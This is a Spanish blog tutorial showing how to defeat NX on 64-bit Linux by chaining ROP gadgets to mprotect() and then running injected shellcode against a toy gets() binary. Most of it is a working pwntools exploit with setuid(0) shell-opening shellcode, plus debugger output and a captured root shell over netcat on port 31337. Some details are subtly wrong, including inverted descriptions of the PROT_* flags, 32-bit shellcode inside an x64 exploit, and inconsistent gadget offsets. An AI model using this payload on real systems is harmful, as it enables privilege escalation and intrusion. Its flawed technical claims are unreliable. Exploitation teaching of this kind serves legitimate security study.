@@ -1,0 +1,195 @@
+I"�E<p class="lead">En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como <code class="language-plaintext highlighter-rouge">ret2libc</code>, <code class="language-plaintext highlighter-rouge">ret2reg</code>, mas que nada tecnicas que usen <code class="language-plaintext highlighter-rouge">ROP</code>. Asi que ahora te voy a mostrar como usar <code class="language-plaintext highlighter-rouge">mprotect()</code> para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.</p>
+
+<h2 id="mprotect">mprotect()</h2>
+
+<p>Segun la man page de Linux <code class="language-plaintext highlighter-rouge">mprotect</code> es:</p>
+
+<p>mprotect () cambia las protecciones de acceso para las páginas de memoria del proceso de llamada que contienen cualquier parte del rango de direcciones en el intervalo [addr, addr+len-1]. addr debe estar alineado con el límite de la página… En caso de éxito, mprotect () devuelve cero. En caso de error, esta llamada al sistema devuelve -1 y errno para indicar el error. se establece</p>
+
+<p>Y aca mas entendible seria que mprotect es la funcion que establece los permisos de lectura y escritura a cierta area de memoria. Esta funcion toma 3 argumentos:</p>
+
+<ul>
+  <li>Una direccion inicial</li>
+  <li>La longitud, que seria el rango en que podemos modificar</li>
+  <li>Y una combinacion de banderas que son las que haran que se establezcan los permisos, estas banderas son:
+    <ul>
+      <li><strong>PROT_READ</strong>: La memoria no se puede leer</li>
+      <li><strong>PROT_WRITE</strong>: La memoria no se puede modificar/escribir</li>
+      <li><strong>PROT_EXEC</strong>: La memoria no se puede ejecutar o no es ejecutable</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="crafteando-el-exploit">Crafteando el exploit</h2>
+
+<h3 id="codigo-vulnerable">Codigo vulnerable</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>No hace falta hacer reversing por que la vulnerabilidad se encuentra en la funcion <code class="language-plaintext highlighter-rouge">gets</code></p>
+
+<p>Como estamos en 64 bits los primero 6 argumentos se pasan los registros RDI, RSI, RDX, RCX, R8 y R9, y cualquier cosa despues se empieza a pasar por el stack.</p>
+
+<p>En x64 para poder hacer esta tecnica ocupados de:</p>
+
+<ul>
+  <li>La direccion base de libc</li>
+  <li>Un gadget <strong>pop rdi</strong>; ret: este funcionara para poner la direccion de la pila en rdi</li>
+  <li>Un gadget <strong>pop rsi</strong>; ret: esta funcionara para poner la longitud en rsi</li>
+  <li>Un gadget <strong>pop rdx</strong>; ret,: este funcionara para establecer el valor 0x7 en rdx, este valor es el de los permisos de lectura, escritura y ejecucion.</li>
+</ul>
+
+<p>Algo asi se llamaria a la funcion mprotect:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#incluye &lt;sys/mman.h&gt; 
+</span>
+       <span class="kt">int</span> <span class="nf">mprotect</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">);</span>
+                            <span class="o">|</span>            <span class="o">|</span>        <span class="o">|</span>
+                            <span class="o">|</span>            <span class="o">|</span>        <span class="o">|</span>
+                           <span class="n">RDI</span>          <span class="n">RSI</span>      <span class="n">RDX</span>
+</code></pre></div></div>
+
+<h3 id="sacando-la-direccion-de-libc">Sacando la direccion de libc</h3>
+
+<p>Dentro del debugger podemos ingresar el comando <code class="language-plaintext highlighter-rouge">vmmap libc</code>, obviamente antes hay que ejecutar el binario. Podemos ver la direccion base de libc:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  vmmap libc
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x007ffff7db6000 0x007ffff7dd8000 0x00000000000000 r-- /usr/lib/libc.so.6
+0x007ffff7dd8000 0x007ffff7f32000 0x00000000022000 r-x /usr/lib/libc.so.6
+0x007ffff7f32000 0x007ffff7f8a000 0x0000000017c000 r-- /usr/lib/libc.so.6
+0x007ffff7f8a000 0x007ffff7f8e000 0x000000001d4000 r-- /usr/lib/libc.so.6
+0x007ffff7f8e000 0x007ffff7f90000 0x000000001d8000 rw- /usr/lib/libc.so.6
+gef➤ 
+</code></pre></div></div>
+<p>La direccion que usare es <code class="language-plaintext highlighter-rouge">0x007ffff7db6000</code></p>
+
+<h3 id="offset-del-rip">Offset del RIP</h3>
+
+<p>Como estamos en x64 podemos hacer uso del offset del RSP o del RBP y sumarle 8.</p>
+
+<p>Como estoy usando GEF, ingresare el comando <code class="language-plaintext highlighter-rouge">pattern create 300</code>, para generar 300 caracteres que le pasaremos como input. Una vez que el programa pete ingresare <code class="language-plaintext highlighter-rouge">pattern offset $rbp</code> para pasar el offset del RBP:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern offset $rbp
+[+] Searching for '$rbp'
+[+] Found at offset 256 (little-endian search) likely
+</code></pre></div></div>
+<p>Ahora le sumamos 8 y nos da 264 que seria el desplazamiento para llegar al RIP.</p>
+
+<p>Hace rato les mencione que mprotect recibia un argumento que es la longitud, debido a que la cadena que le metimos esta desde la direccion <code class="language-plaintext highlighter-rouge">0x007fffffffe418</code>, podemos usar una direccion anterior lo suficientemente grande. Regularmente la longitud que se le pasa a mprotect en estos casos es <code class="language-plaintext highlighter-rouge">0x1000</code>, la cual podra ser desde la direccion <code class="language-plaintext highlighter-rouge">0x7ffffffffe000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x007fffffffe418│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"	 ← aca estan
+0x007fffffffe420│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
+0x007fffffffe428│+0x0010: "kaaaaaablaaaaaabmaaa"
+0x007fffffffe430│+0x0018: "laaaaaabmaaa"
+0x007fffffffe438│+0x0020: 0x007f006161616d ("maaa"?)
+0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/c4rta/Downloads/mprotect"
+0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
+0x007fffffffe450│+0x0038: 0x0000000000000000
+────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Hasta ahora nuestro exploit va asi:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./mprotect"</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"n/sh</span><span class="se">\x68</span><span class="s">//bi</span><span class="se">\x89\xe3\x51\x53\x89\xe1\xb0\x0b</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x007ffff7db6000</span>
+<span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">264</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="mh">0x7ffffffffe000</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
+</code></pre></div></div>
+
+<h3 id="direccion-de-mprotect">Direccion de mprotect</h3>
+
+<p>Dentro de gdb podemos usar <code class="language-plaintext highlighter-rouge">p mprotect</code> y nos da esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p mprotect
+$1 = {&lt;text variable, no debug info&gt;} 0x7ffff7eb62f0 &lt;mprotect&gt;
+</code></pre></div></div>
+
+<h3 id="direcciones-de-los-gadgets">Direcciones de los gadgets</h3>
+
+<p>En mi caso usare ROPGadget pero puden usar ropper o radare2, aqui les puedo decir que no me arrojo ningun gadget, eso no es problema cuando se nos proporciona la libreria que esta usando, en este caso como lo compile en mi maquina, uso la libreria que se encuentra en <code class="language-plaintext highlighter-rouge">/usr/lib/libc.so.6</code>, asi que esa la podemos usar para sacar los gadgets con el comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdi"</code>: 0x0000000000023d35</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rsi"</code>: 0x0000000000025641</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdx"</code>: 0x000000000004e062</p>
+
+<h3 id="ejecutando-el-exploit-final">Ejecutando el exploit final</h3>
+
+<p>Despues de agregar lo que le falta tenemos este exploit:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./mprotect"</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"n/sh</span><span class="se">\x68</span><span class="s">//bi</span><span class="se">\x89\xe3\x51\x53\x89\xe1\xb0\x0b</span><span class="s">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x007ffff7db6000</span>
+<span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">264</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="mh">0x7ffffffffe000</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7eb62f0</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000023d35</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x0000000000025641</span>
+<span class="n">pop_rdx</span> <span class="o">=</span> <span class="mh">0x000000000004e062</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">264</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xAAAAAAAAAAAAAAAA</span><span class="p">)</span> <span class="c1">#junk para r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x007fffffffe418</span><span class="p">)</span> <span class="c1">#direccion desde donde comenzara la shellcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><strong>Ojo:</strong> Antes de ejecutarlo hay que ponernos en escucha por el puerto 31337, ya que la shellcode ejecuta un <code class="language-plaintext highlighter-rouge">setuid(0)</code> y establece una conexion con nosotros mismos por ese puerto</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
+Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
+whoami
+root
+</code></pre></div></div>
+
+<p>Y asi conseguimos ser root, muchas gracias por leer ❤</p>
+:ET
